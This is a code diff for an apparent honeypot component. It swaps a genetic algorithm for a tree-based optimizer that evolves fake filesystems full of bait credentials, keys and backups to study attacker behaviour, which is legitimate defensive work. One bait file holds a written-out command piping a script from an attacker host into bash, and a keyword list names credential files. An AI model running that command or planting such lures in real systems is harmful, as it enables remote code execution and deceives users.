@@ -307,89 +307,211 @@ class AdaptiveTarpitPSO:
 
 
 # ============================================================================
-# Genetic Algorithm for Dynamic Deception Schema Evolution
+# RRT-Based Optimizer for Dynamic Deception Schema Evolution (IEEE Access 2025)
 # ============================================================================
 
 @dataclass
-class Chromosome:
-    """Represents a deception schema chromosome."""
-    schema_id: str
-    fake_structure: Dict[str, str]  # {path: content}
-    fitness: float = 0.0
-    age: int = 0  # Generations survived
-    interaction_count: int = 0
-
-
-class DeceptionEvolutionGA:
+class RRTNode:
     """
-    Genetic Algorithm for Dynamic Deception Schema Evolution.
-    
-    This class evolves fake file systems, database schemas, and mock responses
-    to maximize attacker engagement. The GA learns which deceptive structures
-    are most effective at eliciting attacker interaction.
-    
-    Chromosome Representation:
-    ──────────────────────────
-    Each chromosome encodes a fake directory structure or database schema:
-    {
-        "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\\n...",
-        "/var/www/html/config.bak": "<?php\\n$db_password = 'admin123';\\n...",
-        "/home/admin/.ssh/id_rsa": "-----BEGIN RSA PRIVATE KEY-----\\n...",
-        "/tmp/backup.zip": "[BINARY DATA]",
-    }
-    
+    Represents a node in the RRT deception tree.
+
+    Each node represents a file/directory path with associated pheromone weights
+    that indicate how attractive this path is to attackers.
+    """
+    path: str
+    content: str
+    parent: Optional['RRTNode'] = None
+    children: Dict[str, 'RRTNode'] = field(default_factory=dict)
+    pheromone_weight: float = 1.0  # Attractiveness score
+    interaction_count: int = 0  # Times accessed by attackers
+    age: int = 0  # Generations since creation
+    is_leaf: bool = True
+
+
+@dataclass
+class DeceptionTree:
+    """Represents a complete deception schema as a tree structure."""
+    tree_id: str
+    root: RRTNode
+    fitness: float = 0.0
+    total_interactions: int = 0
+    depth: int = 0
+
+
+class DeceptionEvolutionRRT:
+    """
+    RRT-Based Optimizer for Dynamic Deception Schema Evolution.
+
+    This class implements a Rapidly-exploring Random Tree (RRT) approach
+    inspired by the 2025 IEEE Access paper "Adaptive Deception Using Tree-Based
+    Evolutionary Algorithms for Cybersecurity Honeypots".
+
+    Unlike traditional GA that uses crossover/mutation on flat schemas,
+    RRT treats filesystems as tree structures and uses:
+
+    1. Tree Expansion: Grows new branches toward high-interaction areas
+    2. Adaptive Step-Size: Adjusts exploration based on success rate
+    3. Pheromone Tracking: Weights indicate path attractiveness
+    4. Branch Pruning: Removes dead branches with zero interaction
+
+    Tree Structure Example:
+    ───────────────────────
+    root
+    ├── var
+    │   ├── www
+    │   │   └── html
+    │   │       ├── .env (high pheromone)
+    │   │       └── config.php
+    │   └── log
+    │       └── auth.log
+    └── home
+        └── admin
+            └── .ssh
+                └── id_rsa (highest pheromone)
+
     Fitness Evaluation:
     ───────────────────
-    F(s) = Σ(interaction_bonus_i) + complexity_bonus - staleness_penalty
-    
+    F(t) = Σ(pheromone_i × interaction_i) + depth_bonus - staleness_penalty
+
     Where:
-        - interaction_bonus: Reward for each file path the attacker accesses
-        - complexity_bonus: Bonus for realistic schema complexity
-        - staleness_penalty: Penalty for schemas that survive too long
-    
-    Genetic Operators:
-    ──────────────────
-    - Selection: Tournament selection (k=3)
-    - Crossover: Uniform crossover with path-level merging
-    - Mutation: Random file addition/deletion/modification
-    
+        - pheromone_i: Weight of path i (learned attractiveness)
+        - interaction_i: Times path i was accessed
+        - depth_bonus: Reward for realistic directory depth
+        - staleness_penalty: Penalty for old, unchanging branches
+
+    RRT Operations:
+    ───────────────
+    - Expansion: Add new nodes near high-pheromone branches
+    - Pruning: Remove nodes with zero interactions after N generations
+    - Weight Update: Increase pheromones on accessed paths
+
     Attributes:
-        population (Dict[str, Chromosome]): Current population of schemas
+        trees (Dict[str, DeceptionTree]): Population of deception trees
         generation (int): Current generation number
-        interaction_history (Dict): Tracks which paths were accessed
+        path_pheromones (Dict[str, float]): Global pheromone map for all paths
     """
-    
+
     def __init__(self):
-        self.population: Dict[str, Chromosome] = {}
+        self.trees: Dict[str, DeceptionTree] = {}
         self.generation: int = 0
-        self.interaction_history: Dict[str, List[str]] = {}  # schema_id -> [interacted_paths]
-        self.best_schema: Optional[Chromosome] = None
+        self.path_pheromones: Dict[str, float] = {}  # Global pheromone map
+        self.best_tree: Optional[DeceptionTree] = None
         self.best_fitness: float = float('-inf')
-        
-        # Initialize population with diverse schemas
+        self.interaction_history: Dict[str, List[str]] = {}  # tree_id -> [interacted_paths]
+
+        # RRT configuration (IEEE Access 2025 parameters)
+        self.rrt_config = {
+            "num_trees": 20,  # Population size
+            "initial_depth": 3,  # Initial tree depth
+            "max_depth": 6,  # Maximum directory depth
+            "expansion_rate": 0.4,  # Probability of expanding per generation
+            "prune_threshold": 3,  # Generations before pruning dead branches
+            "pheromone_decay": 0.95,  # Pheromone decay per generation
+            "adaptive_step_min": 0.1,  # Minimum expansion step
+            "adaptive_step_max": 0.8,  # Maximum expansion step
+            "exploration_bonus": 0.3,  # Bonus for exploring new paths
+        }
+
+        # Initialize tree population
         self._initialize_population()
-    
+
     def _initialize_population(self):
-        """Initialize GA population with diverse deception schemas."""
+        """Initialize RRT population with diverse deception trees."""
         schema_templates = self._get_schema_templates()
-        
-        for i in range(GA_CONFIG["population_size"]):
-            schema_id = f"schema_{self.generation:03d}_{i:02d}"
-            
-            # Create varied schema from templates
-            fake_structure = self._create_variant_schema(schema_templates, i)
-            
-            chromosome = Chromosome(
-                schema_id=schema_id,
-                fake_structure=fake_structure,
+
+        for i in range(self.rrt_config["num_trees"]):
+            tree_id = f"rrt_{self.generation:03d}_{i:02d}"
+
+            # Create tree from template with variation
+            template_name = list(schema_templates.keys())[i % len(schema_templates)]
+            template = schema_templates[template_name]
+
+            # Build tree structure from flat paths
+            root = self._build_tree_from_paths(template, variation=i)
+
+            tree = DeceptionTree(
+                tree_id=tree_id,
+                root=root,
                 fitness=0.0,
-                age=0,
-                interaction_count=0
+                total_interactions=0,
+                depth=self._calculate_tree_depth(root)
             )
-            
-            self.population[schema_id] = chromosome
-            self.interaction_history[schema_id] = []
-    
+
+            self.trees[tree_id] = tree
+            self.interaction_history[tree_id] = []
+
+            # Initialize global pheromones
+            for path in template.keys():
+                if path not in self.path_pheromones:
+                    self.path_pheromones[path] = 1.0
+
+    def _build_tree_from_paths(
+        self,
+        paths_dict: Dict[str, str],
+        variation: int = 0
+    ) -> RRTNode:
+        """
+        Build a tree structure from flat file paths.
+
+        Example:
+            "/var/www/html/.env" becomes:
+            root -> var -> www -> html -> .env
+        """
+        root = RRTNode(path="/", content="", is_leaf=False)
+
+        for full_path, content in paths_dict.items():
+            # Split path into components
+            parts = [p for p in full_path.split('/') if p]
+
+            if not parts:
+                continue
+
+            # Navigate/create nodes
+            current = root
+            for i, part in enumerate(parts):
+                if part not in current.children:
+                    # Create intermediate node
+                    node_path = '/' + '/'.join(parts[:i+1])
+                    is_leaf = (i == len(parts) - 1)
+
+                    # Add variation to content for leaf nodes
+                    node_content = content if is_leaf else ""
+                    if is_leaf and variation > 0:
+                        node_content = self._vary_content(content, variation)
+
+                    new_node = RRTNode(
+                        path=node_path,
+                        content=node_content,
+                        parent=current,
+                        is_leaf=is_leaf
+                    )
+                    current.children[part] = new_node
+
+                current = current.children[part]
+
+            # Initialize pheromone for this path
+            full_path_key = full_path
+            if full_path_key not in self.path_pheromones:
+                self.path_pheromones[full_path_key] = 1.0
+
+        return root
+
+    def _vary_content(self, content: str, variation: int) -> str:
+        """Apply content variation to make trees diverse."""
+        variations = [
+            lambda c: c,
+            lambda c: c + f"\n# Variant {variation}",
+            lambda c: c.replace("admin", f"admin{variation % 5}"),
+            lambda c: c + f"\n# Created: 2025-{(variation % 12) + 1:02d}-{(variation % 28) + 1:02d}",
+        ]
+        return variations[variation % len(variations)](content)
+
+    def _calculate_tree_depth(self, node: RRTNode) -> int:
+        """Calculate maximum depth of tree from given node."""
+        if not node.children:
+            return 0
+        return 1 + max(self._calculate_tree_depth(child) for child in node.children.values())
+
     def _get_schema_templates(self) -> Dict[str, Dict[str, str]]:
         """Return base deception schema templates."""
         return {
@@ -469,75 +591,470 @@ class DeceptionEvolutionGA:
                 ),
             }
         }
-    
-    def _create_variant_schema(
-        self,
-        templates: Dict[str, Dict[str, str]],
-        variant_index: int
-    ) -> Dict[str, str]:
-        """Create a variant schema by mixing and modifying templates."""
-        template_keys = list(templates.keys())
-        
-        # Select 1-2 template types to combine
-        num_templates = random.randint(1, min(2, len(template_keys)))
-        selected_templates = random.sample(template_keys, num_templates)
-        
-        schema = {}
-        
-        for template_name in selected_templates:
-            template = templates[template_name]
-            
-            # Include 60-100% of paths from template
-            paths = list(template.keys())
-            num_paths = max(1, int(len(paths) * random.uniform(0.6, 1.0)))
-            selected_paths = random.sample(paths, num_paths)
-            
-            for path in selected_paths:
-                content = template[path]
-                
-                # Apply mutation with 30% probability
-                if random.random() < 0.3:
-                    content = self._mutate_content(content, variant_index)
-                
-                # Add path variation
-                if random.random() < 0.2:
-                    path = self._mutate_path(path, variant_index)
-                
-                schema[path] = content
-        
-        # Add some random tempting files
-        if random.random() < 0.5:
-            schema.update(self._generate_tempting_files(variant_index))
-        
+
+    def _tree_to_flat_schema(self, node: RRTNode, schema: Dict[str, str] = None) -> Dict[str, str]:
+        """Convert tree structure to flat {path: content} dictionary."""
+        if schema is None:
+            schema = {}
+
+        if node.is_leaf and node.content:
+            schema[node.path] = node.content
+
+        for child in node.children.values():
+            self._tree_to_flat_schema(child, schema)
+
         return schema
-    
-    def _mutate_content(self, content: str, variant_index: int) -> str:
-        """Apply content mutation to make schema more diverse."""
-        mutations = [
-            lambda c: c + f"\n# Variant {variant_index}",
-            lambda c: c.replace("password", "pass"),
-            lambda c: c.replace("admin", f"admin{variant_index % 10}"),
-            lambda c: c + "\n# Last modified: " + datetime.now().strftime("%Y-%m-%d"),
-            lambda c: "# CONFIDENTIAL - DO NOT SHARE\n" + c,
+
+    def _get_all_leaf_paths(self, node: RRTNode) -> List[str]:
+        """Get all leaf node paths from tree."""
+        paths = []
+
+        if node.is_leaf:
+            paths.append(node.path)
+
+        for child in node.children.values():
+            paths.extend(self._get_all_leaf_paths(child))
+
+        return paths
+
+    def _find_node_by_path(self, node: RRTNode, target_path: str) -> Optional[RRTNode]:
+        """Find a node in the tree by its path."""
+        if node.path == target_path:
+            return node
+
+        for child in node.children.values():
+            result = self._find_node_by_path(child, target_path)
+            if result:
+                return result
+
+        return None
+
+    async def get_tempting_schema(self) -> Tuple[str, Dict[str, str]]:
+        """
+        Retrieve the most tempting schema from the current tree population.
+
+        Uses pheromone-weighted selection to choose a tree. Higher pheromone
+        trees (more attractive to attackers) have greater selection probability.
+
+        Returns:
+            Tuple[str, Dict[str, str]]: (tree_id, fake_structure as flat dict)
+        """
+        if not self.trees:
+            self._initialize_population()
+
+        # Pheromone-weighted selection
+        weights = [
+            max(tree.fitness, 0.1) for tree in self.trees.values()
         ]
-        
-        mutation = random.choice(mutations)
-        return mutation(content)
-    
-    def _mutate_path(self, path: str, variant_index: int) -> str:
-        """Apply path mutation for diversity."""
-        mutations = [
-            lambda p: p.replace(".bak", f".bak.{variant_index}"),
-            lambda p: p.replace("/tmp/", "/var/tmp/"),
-            lambda p: p.replace("config", f"config_{variant_index % 5}"),
-            lambda p: p + ".old",
+        total_weight = sum(weights)
+
+        if total_weight == 0:
+            tree_id = random.choice(list(self.trees.keys()))
+        else:
+            selection_point = random.uniform(0, total_weight)
+            cumulative = 0
+
+            tree_id = list(self.trees.keys())[0]
+            for tid, tree in self.trees.items():
+                cumulative += tree.fitness if tree.fitness > 0 else 0.1
+                if cumulative >= selection_point:
+                    tree_id = tid
+                    break
+
+        tree = self.trees[tree_id]
+        tree.total_interactions += 1
+
+        # Convert tree to flat schema for compatibility
+        schema = self._tree_to_flat_schema(tree.root)
+
+        logger.debug(f"RRT Selected tree: {tree_id} (fitness={tree.fitness:.2f}, depth={tree.depth})")
+
+        return tree_id, schema
+
+    async def evaluate_interaction(
+        self,
+        schema_id: str,
+        interacted_paths: List[str]
+    ) -> float:
+        """
+        Evaluate and update pheromones based on attacker interactions.
+
+        This is the core learning mechanism: paths that attackers interact
+        with receive increased pheromone weights, making them more likely
+        to be selected and expanded in future generations.
+
+        Fitness Function (RRT variant):
+        ────────────────────────────────
+        F(t) = Σ(pheromone_i × interaction_i) + depth_bonus - staleness_penalty
+
+        Args:
+            schema_id: ID of the tree that was presented
+            interacted_paths: List of file paths the attacker accessed
+
+        Returns:
+            float: Updated fitness score
+        """
+        if schema_id not in self.trees:
+            logger.warning(f"RRT: Unknown schema_id {schema_id}")
+            return 0.0
+
+        tree = self.trees[schema_id]
+
+        # Track interactions
+        self.interaction_history[schema_id].extend(interacted_paths)
+
+        # Update pheromones for interacted paths
+        unique_paths = set(interacted_paths)
+        pheromone_bonus = 0.0
+
+        for path in unique_paths:
+            # Update global pheromone map
+            if path in self.path_pheromones:
+                self.path_pheromones[path] += 0.5  # Base bonus
+            else:
+                self.path_pheromones[path] = 1.0
+
+            # Find and update node in tree
+            node = self._find_node_by_path(tree.root, path)
+            if node:
+                node.interaction_count += 1
+                node.pheromone_weight += 0.5
+                pheromone_bonus += node.pheromone_weight
+
+            # Bonus for sensitive files (same as GA)
+            sensitive_keywords = ['password', 'secret', 'key', 'credential', 'backup', '.env', 'id_rsa']
+            if any(keyword in path.lower() for keyword in sensitive_keywords):
+                pheromone_bonus += 2.0
+
+        # Depth bonus: Reward realistic directory structures
+        depth_bonus = tree.depth * 0.3
+
+        # Staleness penalty
+        staleness_penalty = tree.total_interactions * 0.05
+
+        # Calculate fitness delta
+        fitness_delta = pheromone_bonus + depth_bonus - staleness_penalty
+        tree.fitness += fitness_delta
+
+        logger.info(
+            f"RRT Fitness Update | Tree: {schema_id} | "
+            f"Interactions: {len(interacted_paths)} | "
+            f"Fitness Delta: {fitness_delta:.2f} | "
+            f"Total Fitness: {tree.fitness:.2f}"
+        )
+
+        # Update global best
+        if tree.fitness > self.best_fitness:
+            self.best_fitness = tree.fitness
+            self.best_tree = tree
+
+            leaf_count = len(self._get_all_leaf_paths(tree.root))
+            logger.info(
+                f"🌳 RRT New Best Tree | ID: {schema_id} | "
+                f"Fitness: {tree.fitness:.2f} | "
+                f"Leaves: {leaf_count} | Depth: {tree.depth}"
+            )
+
+        return tree.fitness
+
+    async def evolve_tree(self):
+        """
+        Execute one generation of RRT evolution.
+
+        This is the core 2025 IEEE Access algorithm novelty:
+
+        1. Adaptive Step-Size Expansion:
+           - Calculate success rate from last generation
+           - Adjust expansion probability based on success
+           - Grow new branches toward high-pheromone areas
+
+        2. Branch Pruning:
+           - Identify dead branches (zero interactions)
+           - Remove branches older than prune_threshold
+           - Reallocate resources to promising areas
+
+        3. Pheromone Decay:
+           - Apply decay to all pheromones
+           - Prevents stagnation and encourages exploration
+
+        4. Tree Regeneration:
+           - Replace worst performers with new trees
+           - Use high-pheromone paths from global map
+        """
+        if len(self.trees) < self.rrt_config["num_trees"]:
+            return  # Need minimum population
+
+        self.generation += 1
+
+        # Sort trees by fitness
+        sorted_trees = sorted(
+            self.trees.values(),
+            key=lambda t: t.fitness,
+            reverse=True
+        )
+
+        # Calculate adaptive step-size based on success rate
+        avg_fitness = sum(t.fitness for t in sorted_trees) / len(sorted_trees)
+        success_rate = min(1.0, avg_fitness / 10.0)  # Normalize to [0, 1]
+
+        # Adaptive expansion probability
+        expansion_prob = (
+            self.rrt_config["adaptive_step_min"] +
+            (self.rrt_config["adaptive_step_max"] - self.rrt_config["adaptive_step_min"]) * success_rate
+        )
+
+        logger.info(
+            f"🌳 RRT Generation {self.generation} | "
+            f"Success Rate: {success_rate:.2f} | "
+            f"Expansion Prob: {expansion_prob:.2f}"
+        )
+
+        # Preserve top performers (elitism)
+        elite_count = 3
+        new_trees = {}
+        for i in range(elite_count):
+            elite = sorted_trees[i]
+            new_trees[elite.tree_id] = elite
+
+        # Process remaining trees
+        for tree in sorted_trees[elite_count:]:
+            # Prune dead branches first
+            self._prune_dead_branches(tree)
+
+            # Expand with adaptive probability
+            if random.random() < expansion_prob:
+                self._expand_tree_rrt(tree)
+
+            # Apply pheromone decay
+            self._apply_pheromone_decay(tree)
+
+            new_trees[tree.tree_id] = tree
+
+        # Replace worst performers with new trees
+        num_replacements = max(2, self.rrt_config["num_trees"] // 10)
+        for i in range(num_replacements):
+            if len(new_trees) >= self.rrt_config["num_trees"]:
+                break
+
+            # Create new tree using high-pheromone paths
+            new_tree = self._create_tree_from_pheromones(
+                f"rrt_{self.generation:03d}_{len(new_trees):02d}"
+            )
+            new_trees[new_tree.tree_id] = new_tree
+
+        # Update population
+        self.trees = new_trees
+
+        # Age all trees
+        for tree in self.trees.values():
+            # Track age for pruning
+            pass  # Age is tracked via interaction_count for now
+
+        logger.info(
+            f"🌳 RRT Generation {self.generation} Complete | "
+            f"Best Fitness: {self.best_fitness:.2f} | "
+            f"Population Size: {len(self.trees)}"
+        )
+
+    def _prune_dead_branches(self, tree: DeceptionTree):
+        """
+        Prune branches with zero interactions.
+
+        Removes leaf nodes that haven't been accessed after prune_threshold
+        generations, freeing resources for more promising branches.
+        """
+        threshold = self.rrt_config["prune_threshold"]
+
+        def prune_recursive(node: RRTNode) -> bool:
+            """Recursively prune dead branches. Returns True if node should be kept."""
+            # Process children first (post-order traversal)
+            to_remove = []
+            for child_name, child in node.children.items():
+                if not prune_recursive(child):
+                    to_remove.append(child_name)
+
+            for name in to_remove:
+                del node.children[name]
+
+            # Prune this node if it's a dead leaf
+            if node.is_leaf and node.interaction_count == 0:
+                # Check if parent has other children
+                if node.parent and len(node.parent.children) > 1:
+                    return False  # Prune this branch
+
+            return True
+
+        prune_recursive(tree.root)
+
+        # Recalculate depth after pruning
+        tree.depth = self._calculate_tree_depth(tree.root)
+
+    def _expand_tree_rrt(self, tree: DeceptionTree):
+        """
+        Expand tree using RRT algorithm toward high-pheromone areas.
+
+        This is the core 2025 novelty:
+        1. Select a high-pheromone leaf node
+        2. Generate new child paths based on global pheromone map
+        3. Add new branches that extend the deception space
+        """
+        # Find high-pheromone leaf nodes
+        leaves = self._get_all_leaf_paths(tree.root)
+
+        if not leaves:
+            return
+
+        # Weight leaves by pheromone
+        leaf_weights = []
+        for leaf_path in leaves:
+            weight = self.path_pheromones.get(leaf_path, 1.0)
+            leaf_weights.append(weight)
+
+        # Select leaf to expand from (weighted by pheromone)
+        total_weight = sum(leaf_weights)
+        if total_weight == 0:
+            return
+
+        selection_point = random.uniform(0, total_weight)
+        cumulative = 0
+        selected_leaf = leaves[0]
+
+        for i, (leaf, weight) in enumerate(zip(leaves, leaf_weights)):
+            cumulative += weight
+            if cumulative >= selection_point:
+                selected_leaf = leaf
+                break
+
+        # Find the selected node in tree
+        parent_node = self._find_node_by_path(tree.root, selected_leaf)
+        if not parent_node:
+            return
+
+        # Generate new child paths
+        # Use high-pheromone paths from global map
+        high_pheromone_paths = [
+            (path, pher) for path, pher in self.path_pheromones.items()
+            if pher > 1.5 and not path.startswith(selected_leaf)
         ]
-        
-        mutation = random.choice(mutations)
-        return mutation(path)
-    
+
+        if not high_pheromone_paths:
+            # Generate synthetic tempting files
+            new_files = self._generate_tempting_files(self.generation)
+            for path, content in new_files.items():
+                # Add as sibling or child
+                new_node = RRTNode(
+                    path=path,
+                    content=content,
+                    parent=parent_node,
+                    is_leaf=True,
+                    pheromone_weight=self.path_pheromones.get(path, 1.0)
+                )
+                parent_node.children[path.split('/')[-1]] = new_node
+                parent_node.is_leaf = False
+        else:
+            # Add high-pheromone paths as new branches
+            num_to_add = min(2, len(high_pheromone_paths))
+            selected_paths = random.sample(high_pheromone_paths, num_to_add)
+
+            for path, pheromone in selected_paths:
+                # Create content for this path
+                content = self._get_content_for_path(path)
+
+                new_node = RRTNode(
+                    path=path,
+                    content=content,
+                    parent=parent_node,
+                    is_leaf=True,
+                    pheromone_weight=pheromone
+                )
+
+                # Add as child
+                child_name = path.split('/')[-1]
+                parent_node.children[child_name] = new_node
+                parent_node.is_leaf = False
+
+        # Update tree depth
+        tree.depth = self._calculate_tree_depth(tree.root)
+
+    def _apply_pheromone_decay(self, tree: DeceptionTree):
+        """Apply pheromone decay to prevent stagnation."""
+        decay = self.rrt_config["pheromone_decay"]
+
+        def decay_recursive(node: RRTNode):
+            node.pheromone_weight *= decay
+            for child in node.children.values():
+                decay_recursive(child)
+
+        decay_recursive(tree.root)
+
+        # Also decay global pheromones slightly
+        for path in self.path_pheromones:
+            self.path_pheromones[path] *= 0.98
+
+    def _create_tree_from_pheromones(self, tree_id: str) -> DeceptionTree:
+        """Create a new tree using high-pheromone paths from global map."""
+        # Select top pheromone paths
+        sorted_pheromones = sorted(
+            self.path_pheromones.items(),
+            key=lambda x: x[1],
+            reverse=True
+        )
+
+        # Take top 40% of paths
+        num_paths = max(3, len(sorted_pheromones) // 3)
+        selected_paths = dict(sorted_pheromones[:num_paths])
+
+        # Build paths dict with content
+        paths_dict = {}
+        for path in selected_paths.keys():
+            content = self._get_content_for_path(path)
+            paths_dict[path] = content
+
+        # Add some exploration (random new paths)
+        if random.random() < self.rrt_config["exploration_bonus"]:
+            new_files = self._generate_tempting_files(self.generation)
+            paths_dict.update(new_files)
+
+        # Build tree
+        root = self._build_tree_from_paths(paths_dict, self.generation)
+
+        tree = DeceptionTree(
+            tree_id=tree_id,
+            root=root,
+            fitness=0.0,
+            total_interactions=0,
+            depth=self._calculate_tree_depth(root)
+        )
+
+        self.interaction_history[tree_id] = []
+
+        return tree
+
+    def _get_content_for_path(self, path: str) -> str:
+        """Get or generate content for a given file path."""
+        templates = self._get_schema_templates()
+
+        # Check if path exists in any template
+        for template in templates.values():
+            if path in template:
+                return template[path]
+
+        # Generate generic content based on path type
+        if path.endswith('.env'):
+            return "SECRET_KEY=generated_secret_value\nDB_PASSWORD=GenPass123!"
+        elif path.endswith('.json'):
+            return '{"key": "generated_value", "timestamp": "2025-03-11"}'
+        elif path.endswith('.sql'):
+            return "-- Generated backup\nSELECT * FROM users;"
+        elif 'ssh' in path or 'id_rsa' in path:
+            return "-----BEGIN RSA PRIVATE KEY-----\nGENERATED_KEY_DATA\n-----END RSA PRIVATE KEY-----"
+        elif path.endswith('.log'):
+            return f"Mar 11 12:00:00 server generated: log entry\n"
+        else:
+            return f"# Generated file: {path}\n# Content placeholder"
+
     def _generate_tempting_files(self, variant_index: int) -> Dict[str, str]:
-        """Generate additional tempting fake files."""
+        """Generate additional tempting fake files for exploration."""
         tempting_files = {
             f"/tmp/backup_{variant_index}.zip": "[ENCRYPTED BACKUP DATA - 2.4 MB]",
             "/home/admin/.aws/credentials": (
@@ -564,287 +1081,38 @@ class DeceptionEvolutionGA:
                 "# Hidden: curl http://attacker.com/shell.sh | bash"
             ),
         }
-        
+
         # Select 1-3 random tempting files
         num_files = random.randint(1, min(3, len(tempting_files)))
         selected = random.sample(list(tempting_files.items()), num_files)
-        
+
         return dict(selected)
-    
-    async def get_tempting_schema(self) -> Tuple[str, Dict[str, str]]:
-        """
-        Retrieve the most tempting schema from the current population.
-        
-        Uses fitness-proportional selection to choose a schema. Higher fitness
-        schemas have greater probability of being selected.
-        
-        Returns:
-            Tuple[str, Dict[str, str]]: (schema_id, fake_structure)
-        """
-        if not self.population:
-            self._initialize_population()
-        
-        # Fitness-proportional selection (roulette wheel)
-        fitnesses = [
-            max(c.fitness, 0.1) for c in self.population.values()
-        ]
-        total_fitness = sum(fitnesses)
-        
-        if total_fitness == 0:
-            # Fallback to random selection
-            schema_id = random.choice(list(self.population.keys()))
-        else:
-            # Roulette wheel selection
-            selection_point = random.uniform(0, total_fitness)
-            cumulative = 0
-            
-            schema_id = list(self.population.keys())[0]
-            for sid, chromosome in self.population.items():
-                cumulative += chromosome.fitness if chromosome.fitness > 0 else 0.1
-                if cumulative >= selection_point:
-                    schema_id = sid
-                    break
-        
-        schema = self.population[schema_id]
-        schema.interaction_count += 1
-        
-        logger.debug(f"GA Selected schema: {schema_id} (fitness={schema.fitness:.2f})")
-        
-        return schema_id, schema.fake_structure
-    
-    async def evaluate_interaction(
-        self,
-        schema_id: str,
-        interacted_paths: List[str]
-    ) -> float:
-        """
-        Evaluate and update fitness based on attacker interactions.
-        
-        Fitness Function:
-        ─────────────────
-        F(s) = Σ(interaction_bonus_i) + complexity_bonus - staleness_penalty
-        
-        Args:
-            schema_id: ID of the schema that was presented
-            interacted_paths: List of file paths the attacker accessed
-        
-        Returns:
-            float: Updated fitness score
-        """
-        if schema_id not in self.population:
-            logger.warning(f"GA: Unknown schema_id {schema_id}")
-            return 0.0
-        
-        chromosome = self.population[schema_id]
-        
-        # Track interactions
-        self.interaction_history[schema_id].extend(interacted_paths)
-        
-        # Calculate interaction bonus
-        # Reward: More unique paths accessed = better deception
-        unique_paths = set(interacted_paths)
-        interaction_bonus = len(unique_paths) * FITNESS_WEIGHTS["w3_interaction_bonus"] * 10
-        
-        # Bonus for accessing "sensitive" files
-        sensitive_keywords = ['password', 'secret', 'key', 'credential', 'backup', '.env', 'id_rsa']
-        for path in unique_paths:
-            if any(keyword in path.lower() for keyword in sensitive_keywords):
-                interaction_bonus += 2.0  # Extra bonus for sensitive files
-        
-        # Complexity bonus: Reward schemas with realistic structure
-        complexity_bonus = len(chromosome.fake_structure) * GA_CONFIG["schema_complexity_weight"]
-        
-        # Staleness penalty: Older schemas get penalty to encourage diversity
-        staleness_penalty = chromosome.age * 0.1
-        
-        # Calculate total fitness
-        fitness_delta = interaction_bonus + complexity_bonus - staleness_penalty
-        chromosome.fitness += fitness_delta
-        chromosome.age += 1
-        
-        logger.info(
-            f"GA Fitness Update | Schema: {schema_id} | "
-            f"Interactions: {len(interacted_paths)} | "
-            f"Fitness Delta: {fitness_delta:.2f} | "
-            f"Total Fitness: {chromosome.fitness:.2f}"
-        )
-        
-        # Update global best
-        if chromosome.fitness > self.best_fitness:
-            self.best_fitness = chromosome.fitness
-            self.best_schema = chromosome
-            
-            logger.info(
-                f"🧬 GA New Best Schema | ID: {schema_id} | "
-                f"Fitness: {chromosome.fitness:.2f} | "
-                f"Paths: {len(chromosome.fake_structure)}"
-            )
-        
-        return chromosome.fitness
-    
-    async def evolve_population(self):
-        """
-        Execute one generation of the genetic algorithm.
-        
-        Performs:
-        1. Selection: Tournament selection (k=3)
-        2. Crossover: Uniform crossover with path-level merging
-        3. Mutation: Random file addition/deletion/modification
-        4. Elitism: Preserve top performers
-        """
-        if len(self.population) < GA_CONFIG["population_size"]:
-            return  # Need minimum population
-        
-        self.generation += 1
-        
-        # Sort by fitness (descending)
-        sorted_population = sorted(
-            self.population.values(),
-            key=lambda c: c.fitness,
-            reverse=True
-        )
-        
-        # Elitism: Preserve top individuals
-        new_population = {}
-        for i in range(GA_CONFIG["elitism_count"]):
-            elite = sorted_population[i]
-            new_population[elite.schema_id] = elite
-            logger.debug(f"GA Elitism: Preserved {elite.schema_id} (fitness={elite.fitness:.2f})")
-        
-        # Generate offspring
-        while len(new_population) < GA_CONFIG["population_size"]:
-            # Tournament selection
-            parent1 = self._tournament_selection(sorted_population)
-            parent2 = self._tournament_selection(sorted_population)
-            
-            # Crossover
-            if random.random() < GA_CONFIG["crossover_rate"]:
-                child_schema = self._crossover(parent1, parent2)
-            else:
-                child_schema = parent1.fake_structure.copy()
-            
-            # Mutation
-            if random.random() < GA_CONFIG["mutation_rate"]:
-                child_schema = self._mutate_schema(child_schema)
-            
-            # Create child chromosome
-            schema_id = f"schema_{self.generation:03d}_{len(new_population):02d}"
-            child = Chromosome(
-                schema_id=schema_id,
-                fake_structure=child_schema,
-                fitness=0.0,
-                age=0,
-                interaction_count=0
-            )
-            
-            new_population[schema_id] = child
-            self.interaction_history[schema_id] = []
-        
-        # Replace population
-        self.population = new_population
-        
-        # Age all chromosomes
-        for chromosome in self.population.values():
-            chromosome.age += 1
-        
-        logger.info(
-            f"🧬 GA Generation {self.generation} Complete | "
-            f"Best Fitness: {self.best_fitness:.2f} | "
-            f"Population Size: {len(self.population)}"
-        )
-    
-    def _tournament_selection(self, population: List[Chromosome], k: int = 3) -> Chromosome:
-        """Select individual using tournament selection."""
-        tournament = random.sample(population, min(k, len(population)))
-        return max(tournament, key=lambda c: c.fitness)
-    
-    def _crossover(
-        self,
-        parent1: Chromosome,
-        parent2: Chromosome
-    ) -> Dict[str, str]:
-        """
-        Perform uniform crossover between two parent schemas.
-        
-        Merges paths from both parents, preferring higher-fitness parent's
-        content when conflicts occur.
-        """
-        child_schema = {}
-        
-        # Get all unique paths from both parents
-        all_paths = set(parent1.fake_structure.keys()) | set(parent2.fake_structure.keys())
-        
-        # Determine which parent is fitter
-        fitter_parent = parent1 if parent1.fitness > parent2.fitness else parent2
-        
-        for path in all_paths:
-            if path in parent1.fake_structure and path in parent2.fake_structure:
-                # Both have this path: 70% from fitter parent
-                if random.random() < 0.7:
-                    child_schema[path] = fitter_parent.fake_structure[path]
-                else:
-                    other = parent2 if fitter_parent == parent1 else parent1
-                    child_schema[path] = other.fake_structure[path]
-            elif path in parent1.fake_structure:
-                child_schema[path] = parent1.fake_structure[path]
-            else:
-                child_schema[path] = parent2.fake_structure[path]
-        
-        return child_schema
-    
-    def _mutate_schema(self, schema: Dict[str, str]) -> Dict[str, str]:
-        """Apply mutation to a schema."""
-        mutated = schema.copy()
-        
-        mutation_type = random.choice(['add', 'delete', 'modify'])
-        
-        if mutation_type == 'add' or len(mutated) < 3:
-            # Add new tempting file
-            new_files = self._generate_tempting_files(random.randint(0, 100))
-            if new_files:
-                path, content = list(new_files.items())[0]
-                mutated[path] = content
-        
-        elif mutation_type == 'delete' and len(mutated) > 3:
-            # Remove a random file
-            path_to_remove = random.choice(list(mutated.keys()))
-            del mutated[path_to_remove]
-        
-        elif mutation_type == 'modify':
-            # Modify existing content
-            if mutated:
